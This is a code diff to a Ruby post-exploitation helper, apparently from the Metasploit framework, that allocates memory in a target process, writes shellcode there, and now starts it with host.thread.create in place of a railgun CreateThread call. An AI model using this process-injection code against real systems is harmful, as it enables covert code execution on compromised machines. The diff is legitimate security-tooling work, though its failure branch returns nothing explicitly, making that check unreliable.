@@ -10,8 +10,8 @@ module Process
   # Injects shellcode to a process, and executes it.
   #
   # @param shellcode [String] The shellcode to execute
-  # @param base_addr [Fixnum] The base address to allocate memory
-  # @param pid       [Fixnum] The process ID to inject to
+  # @param base_addr [Integer] The base address to allocate memory
+  # @param pid       [Integer] The process ID to inject to
   #
   # @return [Boolean] True if successful, otherwise false
   #
@@ -23,19 +23,22 @@ module Process
     else
       shell_addr = host.memory.allocate(shellcode.length, nil, base_addr)
     end
+
+    host.memory.protect(shell_addr)
+
     if host.memory.write(shell_addr, shellcode) < shellcode.length
       vprint_error("Failed to write shellcode")
       return false
     end
 
     vprint_status("Creating the thread to execute in 0x#{shell_addr.to_s(16)} (pid=#{pid.to_s})")
-    ret = session.railgun.kernel32.CreateThread(nil, 0, shell_addr, nil, 0, nil)
-    if ret['return'] < 1
-      vprint_error("Unable to CreateThread")
-      return false
+    thread = host.thread.create(shell_addr,0)
+    unless thread.instance_of?(Rex::Post::Meterpreter::Extensions::Stdapi::Sys::Thread)
+      vprint_error("Unable to create thread")
+      nil
     end
 
-    true
+    thread
   end
 
 end # Process
